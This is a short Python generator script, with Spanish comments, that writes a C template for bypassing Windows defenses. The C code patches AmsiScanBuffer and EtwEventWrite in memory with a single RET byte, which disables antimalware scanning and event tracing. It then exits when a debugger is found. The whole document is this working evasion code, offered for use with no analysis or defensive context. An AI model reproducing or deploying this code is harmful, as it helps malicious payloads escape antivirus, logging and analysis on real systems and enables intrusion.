#simple plantilla de uso
def generate_bypass_code():
    print("\n[+] Generando plantilla para bypass de defensas (AMSI, ETW, anti-debug)...")

    code = '''
// templates/bypass.c
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "kernel32.lib")

void patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    void *addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!addr) return;

    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, "\\xC3", 1); // RET
    VirtualProtect(addr, 1, old, &old);
}

void patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    void *addr = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!addr) return;

    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, "\\xC3", 1); // RET
    VirtualProtect(addr, 1, old, &old);
}

int is_debugger_present() {
    return IsDebuggerPresent();
}

void run_bypass() {
    patch_amsi();
    patch_etw();

    if (is_debugger_present()) {
        MessageBoxA(NULL, "Debugger detectado", "Bypass", MB_ICONWARNING);
        ExitProcess(0);
    }
}
'''

    with open("templates/bypass.c", "w") as f:
        f.write(code.strip())

    print("[+] Archivo generado: templates/bypass.c")
